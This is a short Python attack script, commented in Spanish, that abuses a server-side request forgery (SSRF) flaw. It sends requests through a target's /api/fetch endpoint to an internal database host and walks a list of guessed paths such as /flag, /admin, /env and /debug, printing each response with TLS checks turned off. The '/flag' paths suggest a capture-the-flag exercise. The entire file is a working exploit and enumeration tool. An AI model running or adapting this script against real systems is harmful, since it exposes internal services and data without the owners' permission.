#!/usr/bin/env python3
"""Fireburned - enumera rutas del servicio interno via SSRF."""
import json
import sys
import time

import requests
import urllib3

urllib3.disable_warnings()

BASE = "https://<host>/fireburned"
HEADERS = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
DB = "http://fireburned--db:8080"


def fetch(url, method="GET", body=None, max_tries=25):
    payload = {"url": url, "method": method}
    if body is not None:
        payload["body"] = body
    for _ in range(max_tries):
        try:
            r = requests.post(BASE + "/api/fetch", data=json.dumps(payload),
                              headers=HEADERS, timeout=15, verify=False)
            if r.status_code in (502, 503, 504):
                time.sleep(0.3)
                continue
            return r
        except Exception:
            time.sleep(0.3)
    return None


def probe(path, extra=None):
    url = DB + path
    r = fetch(url)
    if r is None:
        print(f"{path:28} -> SIN RESPUESTA")
        return
    try:
        j = r.json()
        print(f"{path:28} -> {r.status_code} {json.dumps(j)[:300]}")
    except Exception:
        print(f"{path:28} -> {r.status_code} {r.text[:300]}")


if __name__ == "__main__":
    paths = sys.argv[1:] or [
        "/", "/health", "/api", "/api/", "/api/health", "/api/cards",
        "/api/card", "/cards", "/card", "/api/store", "/store", "/drafts",
        "/api/drafts", "/flag", "/api/flag", "/admin", "/docs", "/api/docs/",
        "/openapi.json", "/api/openapi.json", "/status", "/debug", "/env",
        "/metrics", "/api/cards/1", "/cards/1", "/card/1", "/api/cards/0",
        "/api/preview", "/favicon.ico",
    ]
    for p in paths:
        probe(p)
